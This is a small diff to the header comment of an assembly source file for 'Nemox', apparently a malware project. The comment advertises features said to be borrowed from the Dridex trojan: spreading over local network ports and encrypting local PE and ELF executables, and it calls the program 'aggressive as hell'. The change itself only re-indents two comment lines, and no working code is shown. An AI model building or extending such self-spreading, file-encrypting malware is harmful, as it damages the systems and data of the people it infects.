@@ -11,8 +11,8 @@
 ;   borrowed from the Dridex trojan such as:
 ;       - Spreading via local Network Ports
 ;       - Encrypting local PE and ELF files
-;    This is everything... Yeah! Nemox is meant to be 
-;    simple but aggressive as hell...
+;   This is everything... Yeah! Nemox is meant to be 
+;   simple but aggressive as hell...
 ;
 .include "include/nemox.h"
 section .text
